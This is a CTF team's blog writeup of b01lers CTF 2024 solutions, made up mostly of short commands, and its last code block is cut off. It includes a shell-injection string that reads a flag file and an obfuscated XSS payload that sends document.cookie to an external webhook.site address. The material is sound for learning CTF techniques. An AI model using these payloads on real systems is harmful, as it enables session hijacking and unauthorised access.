<!DOCTYPE html><html lang="ja"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" href="/blog/favicon.ico"><meta name="theme-color" content="#22222a"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.10/dist/katex.min.css" integrity="sha384-wcIxkf4k558AjM3Yz3BBFQUbk/zgIYC2R0QpeeYb+TwlBVMrlgLqwRjRtGZiK7ww" crossorigin="anonymous"><title>
      b01lers CTF 2024 Writeup | Wani Hackase Blog
    </title> <title>b01lers CTF 2024 Writeup | Wani Hackase Blog</title><link rel="canonical" href="http://localhost:4321/blog/posts/b01lers-ctf-2024/"><meta name="robots" content="index, follow"><meta property="og:title" content="b01lers CTF 2024 Writeup | Wani Hackase Blog"><meta property="og:type" content="article"><meta property="og:image" content="https://wanictf.org/blog/og/b01lers-ctf-2024.png"><meta property="og:url" content="http://localhost:4321/blog/posts/b01lers-ctf-2024/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:creator" content="@wanictf"> <link rel="stylesheet" href="/blog/_astro/index.D-C6ycov.css"></head> <body> <div class="max-w-[832px] px-4 mx-auto"> <div class="mb-2"><div class="flex items-center py-2"> <div class="text-2xl"> <a href="/blog">Wani Hackase Blog</a> </div> <div class="flex-grow"></div> <div class="flex gap-4"> <div><a href="/blog">Home</a></div> <div><a href="https://wanictf.org/about/">About</a></div> </div> </div></div> <div class="mb-4"><hr></div>   <div class="markdown-content"> <h1 id="b01lers-ctf-2024-writeup">b01lers CTF 2024 Writeup</h1>
<h2 id="miscwabash">misc/wabash</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-keyword)"> ||</span><span style="color:var(--astro-code-token-function)">cat$</span><span style="color:var(--astro-code-color-text)">{IFS}</span><span style="color:var(--astro-code-token-function)">/flag.txt</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">sh:</span><span style="color:var(--astro-code-token-string)"> 1:</span><span style="color:var(--astro-code-token-string)"> wa:</span><span style="color:var(--astro-code-token-string)"> not</span><span style="color:var(--astro-code-token-string)"> found</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">bctf</span><span style="color:var(--astro-code-color-text)">{wabash:_command_not_found521065b339eb59a71c06a0dec824cd55}</span></span>
<span class="line"></span></code></pre>
<h2 id="miscbash-cat-with-pipe">misc/bash cat with pipe</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-function)">$</span><span style="color:var(--astro-code-token-string)"> cat</span><span style="color:var(--astro-code-token-string)"> with</span><span style="color:var(--astro-code-token-keyword)"> |</span><span style="color:var(--astro-code-token-function)"> ls</span><span style="color:var(--astro-code-token-keyword)"> |</span><span style="color:var(--astro-code-token-function)"> xargs</span><span style="color:var(--astro-code-token-string)"> cat</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">bctf</span><span style="color:var(--astro-code-color-text)">{owwwww_th4t_hurt}</span><span style="color:var(--astro-code-token-function)">#!/usr/local/bin/python3</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">...</span></span>
<span class="line"></span></code></pre>
<h2 id="webb01ler-ad">web/b01ler-ad</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-color-text)">&#x3C;</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-color-text)">></span><span style="color:var(--astro-code-token-constant)">window</span><span style="color:var(--astro-code-token-function)">.</span><span style="color:var(--astro-code-token-constant)">location</span><span style="color:var(--astro-code-token-function)">.replace</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">String</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">104</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">116</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">116</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">112</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">115</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">58</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">47</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">47</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">119</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">101</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">104</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">111</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">111</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">107</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">46</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">115</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">105</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">116</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">101</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">47</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">57</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">99</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">97</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">54</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">48</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">49</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">48</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">45</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">56</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">48</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">99</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">45</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">52</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">102</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">48</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">45</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">98</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">51</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">50</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">56</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">45</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">57</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">102</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">99</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">99</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">101</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">57</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">56</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">49</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">50</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">102</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">100</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">101</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">BString</span><span style="color:var(--astro-code-token-function)">.fromCharCode</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">63</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">%</span><span style="color:var(--astro-code-color-text)">2</span><span style="color:var(--astro-code-token-constant)">Bdocument</span><span style="color:var(--astro-code-color-text)">.cookie)&#x3C;/</span><span style="color:var(--astro-code-token-string-expression)">script</span><span style="color:var(--astro-code-color-text)">></span></span>
<span class="line"></span></code></pre>
<h2 id="revannnnnnny-second-now">rev/Annnnnnny Second Now</h2>
<p>Since <code>super_optimized_function</code> is just the Fibonacci series, we can calculate the value in advance.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">></span><span style="color:var(--astro-code-color-text)"> cache</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)">[]</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-function)">fib</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)">x</span><span style="color:var(--astro-code-token-keyword)">=></span><span style="color:var(--astro-code-color-text)">x</span><span style="color:var(--astro-code-token-keyword)">&#x3C;=</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-keyword)">n?</span><span style="color:var(--astro-code-color-text)">x</span><span style="color:var(--astro-code-token-keyword)">:</span><span style="color:var(--astro-code-color-text)">cache[x]</span><span style="color:var(--astro-code-token-keyword)">?</span><span style="color:var(--astro-code-color-text)">cache[x]</span><span style="color:var(--astro-code-token-keyword)">:</span><span style="color:var(--astro-code-color-text)">(cache[x]</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)">fib</span><span style="color:var(--astro-code-color-text)">(x</span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-keyword)">n</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-keyword)">+</span><span style="color:var(--astro-code-token-function)">fib</span><span style="color:var(--astro-code-color-text)">(x</span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-constant)">2</span><span style="color:var(--astro-code-token-keyword)">n</span><span style="color:var(--astro-code-color-text)">));</span><span style="color:var(--astro-code-token-function)">fib</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-function)">BigInt</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-constant)">0x5a</span><span style="color:var(--astro-code-color-text)">))</span></span>
<span class="line"><span style="color:var(--astro-code-token-constant)">2880067194370816120</span><span style="color:var(--astro-code-token-keyword)">n</span></span>
<span class="line"></span></code></pre>
<p>Then we just use <a href="https://github.com/hugsy/gef">GEF</a> with GDB.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-function)">gef➤</span><span style="color:var(--astro-code-token-string)">  stub</span><span style="color:var(--astro-code-token-string)"> --retval</span><span style="color:var(--astro-code-token-constant)"> 2880067194370816120</span><span style="color:var(--astro-code-token-string)"> super_optimized_calculation</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">Breakpoint</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-token-string)"> at</span><span style="color:var(--astro-code-token-constant)"> 0x555555555171</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">[+] All calls to </span><span style="color:var(--astro-code-token-string-expression)">'super_optimized_calculation'</span><span style="color:var(--astro-code-color-text)"> will be skipped (</span><span style="color:var(--astro-code-token-function)">with</span><span style="color:var(--astro-code-token-string)"> return</span><span style="color:var(--astro-code-token-string)"> value</span><span style="color:var(--astro-code-token-string)"> set</span><span style="color:var(--astro-code-token-string)"> to</span><span style="color:var(--astro-code-token-constant)"> 0x27f80ddaa1ba7878</span><span style="color:var(--astro-code-color-text)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">gef➤</span><span style="color:var(--astro-code-token-string)">  run</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">Starting</span><span style="color:var(--astro-code-token-string)"> program:</span><span style="color:var(--astro-code-token-string)"> /home/southball/ctf/B01lersCTF2024/Annnnnnny</span><span style="color:var(--astro-code-token-string)"> Second</span><span style="color:var(--astro-code-token-string)"> Now/Annnnnnny-Second-Now</span><span style="color:var(--astro-code-color-text)"> </span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">[Thread debugging using libthread_db enabled]</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">Using</span><span style="color:var(--astro-code-token-string)"> host</span><span style="color:var(--astro-code-token-string)"> libthread_db</span><span style="color:var(--astro-code-token-string)"> library</span><span style="color:var(--astro-code-token-string-expression)"> "/lib/x86_64-linux-gnu/libthread_db.so.1"</span><span style="color:var(--astro-code-token-string)">.</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">[+] Ignoring call to </span><span style="color:var(--astro-code-token-string-expression)">'super_optimized_calculation'</span><span style="color:var(--astro-code-color-text)"> (</span><span style="color:var(--astro-code-token-function)">setting</span><span style="color:var(--astro-code-token-string)"> return</span><span style="color:var(--astro-code-token-string)"> value</span><span style="color:var(--astro-code-token-string)"> to</span><span style="color:var(--astro-code-token-constant)"> 0x27f80ddaa1ba7878</span><span style="color:var(--astro-code-color-text)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">bctf</span><span style="color:var(--astro-code-color-text)">{what</span><span style="color:var(--astro-code-token-function)">'s_memoization?}</span></span>
<span class="line"></span></code></pre>
<h2 id="pwnshall-we-play-a-game">pwn/shall-we-play-a-game</h2>
<!-- TODO -->
<h2 id="revjs-safe">rev/js-safe</h2>
<p>The code is obfuscated, so we use <code>https://deobfuscate.io/</code> to deobfuscate the code and ChatGPT to make the variable names make sense. Then solve the password to be <code>"p4wR0d"</code>.</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">></span><span style="color:var(--astro-code-token-function)"> require</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-string-expression)">"crypto-js"</span><span style="color:var(--astro-code-color-text)">).</span><span style="color:var(--astro-code-token-constant)">AES</span><span style="color:var(--astro-code-token-function)">.decrypt</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-string-expression)">"U2FsdGVkX19WKWdho02xWkalqVZ3YrA7QrNN4JPOIb5OEO0CW3Qj8trHrcQNOwsw"</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> "p4wR0d"</span><span style="color:var(--astro-code-color-text)">)</span><span style="color:var(--astro-code-token-function)">.toString</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-function)">require</span><span 